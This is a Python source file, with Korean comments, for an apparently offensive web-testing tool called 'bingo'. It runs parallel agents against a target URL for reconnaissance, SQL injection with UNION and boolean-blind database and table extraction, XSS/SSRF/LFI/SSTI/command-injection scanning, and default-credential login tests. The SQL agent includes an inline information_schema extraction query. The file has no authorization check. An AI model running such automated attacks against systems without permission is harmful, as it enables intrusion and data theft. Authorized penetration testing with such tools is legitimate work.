"""
bingo Multi-Agent — Cursor처럼 전문 에이전트들이 동시에 독립 작업.

에이전트 구성:
  ReconAgent   — 서브도메인, 포트, 기술 스택, 디렉터리
  SQLiAgent    — SQL 인젝션 탐지 + 완전 덤프
  WebVulnAgent — XSS/SSRF/LFI/SSTI/CMDi/CORS
  AuthAgent    — 로그인 폼 탐지, 기본 자격증명, 세션 분석

사용법:
    from bingo.core.multi_agent import MultiAgent
    agent = MultiAgent(console=rich_console)
    result = agent.run("https://target.com/page?id=1")
"""
from __future__ import annotations
import sys, os
from typing import Any

# agent_tools import 경로 등록
sys.path.insert(0, os.path.expanduser("~/.bingo"))

from .parallel_runner import ParallelRunner, Task


# ── 에이전트 함수들 ───────────────────────────────────────────────

def _recon_agent(target_url: str) -> dict:
    """정찰 에이전트 — 기술 스택, 포트, 서브도메인, 디렉터리."""
    try:
        from recon_tools import Recon
        r = Recon(target_url)
        r.resolve_ip()
        r.fingerprint()
        r.analyze_headers()
        r.analyze_ssl()
        r.scan_ports()
        r.dir_brute()
        return r.findings
    except ImportError:
        # recon_tools 없으면 기본 httpx로
        try:
            import httpx
            client = httpx.Client(verify=False, timeout=8, follow_redirects=True)
            r = client.get(target_url)
            return {
                "status": r.status_code,
                "server": r.headers.get("server", "unknown"),
                "technologies": [h for h in r.headers if "powered" in h.lower()],
            }
        except Exception as e:
            return {"error": str(e)}


def _sqli_agent(target_url: str) -> dict:
    """SQLi 에이전트 — WAF 탐지 + UNION/Boolean/Time 자동 선택."""
    try:
        from agent_tools import T
        t = T(target_url)
        result: dict = {"target": target_url, "injectable": False}

        waf = t.detect_waf()
        result["waf"] = waf

        # 에러 기반 확인
        import re
        _, _, body = t.inject("'")
        err = t.has_sql_error(body)
        if err:
            result["type"] = "error-based"
            result["injectable"] = True

        # UNION 시도
        db = t.union_extract_marked("database()")
        if db:
            result["injectable"] = True
            result["method"] = "UNION"
            result["database"] = db
            tables_raw = t.union_extract_marked(
                f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
                f"FROM information_schema.tables WHERE table_schema=database()"
            )
            result["tables"] = tables_raw.split(",") if tables_raw else []
            return result

        # Boolean 시도
        if t.calibrate_boolean():
            result["injectable"] = True
            result["method"] = "Boolean Blind"
            db = t.bool_extract_string("database()")
            result["database"] = db
            result["tables"]   = t.dump_tables(db) if db else []
            return result

        return result
    except Exception as e:
        return {"error": str(e)}


def _webvuln_agent(target_url: str) -> list[dict]:
    """웹 취약점 에이전트 — XSS/SSRF/LFI/SSTI/CORS."""
    try:
        from web_tools import WebScanner
        ws = WebScanner(target_url)
        ws.scan_cors()
        ws.scan_open_redirect()
        if ws.params:
            ws.scan_xss()
            ws.scan_ssrf()
            ws.scan_lfi()
            ws.scan_ssti()
            ws.scan_cmdi()
        return ws.findings
    except Exception as e:
        return [{"error": str(e)}]


def _auth_agent(target_url: str) -> dict:
    """인증 에이전트 — 로그인 폼, 기본 자격증명, 세션."""
    try:
        from auth_tools import Auth
        a = Auth(target_url)
        form = a.detect_login_form()
        result: dict = {"form_found": form is not None}
        if form:
            creds = a.test_default_creds(form)
            result["default_creds"] = creds
            sess = a.analyze_session()
            result["session"] = sess
        return result
    except Exception as e:
        return {"error": str(e)}


# ── 메인 멀티 에이전트 ────────────────────────────────────────────

class MultiAgent:
    """
    Cursor처럼 전문 에이전트들이 동시에 독립 작업을 수행.

    Args:
        console: Rich Console 인스턴스 (없으면 기본 콘솔 사용)
    """

    def __init__(self, console=None):
        self.console = console
        self._results: dict = {}

    def run(self, target_url: str, agents: list[str] | None = None) -> dict:
        """
        지정된 에이전트들을 병렬 실행.

        agents: ["recon", "sqli", "webvuln", "auth"] 중 선택 (기본: 전체)
        """
        available = {
            "recon":   Task("🔍 Recon",   _recon_agent,   args=(target_url,), timeout=90),
            "sqli":    Task("💉 SQLi",    _sqli_agent,    args=(target_url,), timeout=120),
            "webvuln": Task("🌐 WebVuln", _webvuln_agent, args=(target_url,), timeout=90),
            "auth":    Task("🔑 Auth",    _auth_agent,    args=(target_url,), timeout=60),
        }

        selected_names = agents or list(available.keys())
        tasks = [available[n] for n in selected_names if n in available]

        if not tasks:
            return {}

        runner = ParallelRunner(
            max_workers=len(tasks),
            on_start=self._on_start,
            on_done=self._on_done,
            on_error=self._on_error,
        )

        if self.console:
            self._results = runner.run_with_progress(tasks, console=self.console)
        else:
            self._results = runner.run(tasks)

        self._print_summary()
        return self._results

    def _on_start(self, task: Task) -> None:
        pass  # run_with_progress가 Live로 처리

    def _on_done(self, task: Task) -> None:
        pass

    def _on_error(self, task: Task) -> None:
        pass

    def _print_summary(self) -> None:
        """스캔 결과 요약 출력."""
        try:
            from rich.panel import Panel
            from rich.text import Text
            from rich.console import Console

            console = self.console or Console()
            lines = []

            # Recon 요약
            recon = self._results.get("🔍 Recon") or {}
            if recon and not recon.get("error"):
                lines.append(f"[bold cyan]📡 Recon[/bold cyan]")
                lines.append(f"  IP: {recon.get('ip', 'N/A')}")
                techs = recon.get('technologies', [])
                if techs:
                    lines.append(f"  Techs: {', '.join(techs[:5])}")
                ports = recon.get('open_ports', [])
                if ports:
                    lines.append(f"  Ports: {ports}")
                dirs = recon.get('directories', [])
                if dirs:
                    lines.append(f"  Dirs: {len(dirs)} found ({', '.join(d['url'].split('/')[-1] for d in dirs[:3])})")

            # SQLi 요약
            sqli = self._results.get("💉 SQLi") or {}
            if sqli and not sqli.get("error"):
                lines.append(f"\n[bold red]💉 SQLi[/bold red]")
                if sqli.get("injectable"):
                    lines.append(f"  🔴 VULNERABLE — {sqli.get('method', '?')}")
                    lines.append(f"  DB: {sqli.get('database', 'N/A')}")
                    tables = sqli.get('tables', [])
                    if tables:
                        lines.append(f"  Tables: {', '.join(tables[:5])}")
                    if sqli.get('waf'):
                        lines.append(f"  WAF: {sqli['waf']}")
                else:
                    lines.append(f"  ✅ Not injectable")

            # WebVuln 요약
            web = self._results.get("🌐 WebVuln") or []
            if web and not (isinstance(web, list) and web and web[0].get("error")):
                lines.append(f"\n[bold yellow]🌐 Web Vulns[/bold yellow]")
                for f in web[:5]:
                    sev = f.get("severity", "?")
                    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sev, "⚪")
                    lines.append(f"  {icon} {f.get('type', '?')}: {str(f.get('detail',''))[:60]}")
                if len(web) > 5:
                    lines.append(f"  ... +{len(web)-5} more")

            # Auth 요약
            auth = self._results.get("🔑 Auth") or {}
            if auth and not auth.get("error"):
                lines.append(f"\n[bold green]🔑 Auth[/bold green]")
                creds = auth.get("default_creds", [])
                if creds:
                    lines.append(f"  🔴 Default creds found: {creds}")
                else:
                    lines.append(f"  ✅ No default creds")
                sess_issues = (auth.get("session") or {}).get("issues", [])
                if sess_issues:
                    for issue in sess_issues[:3]:
                        lines.append(f"  ⚠️  {issue}")

            if lines:
                console.print(Panel(
                    "\n".join(lines),
                    title="[bold]BINGO MULTI-AGENT RESULTS[/bold]",
                    border_style="cyan",
                    expand=False,
                ))
        except Exception:
            pass
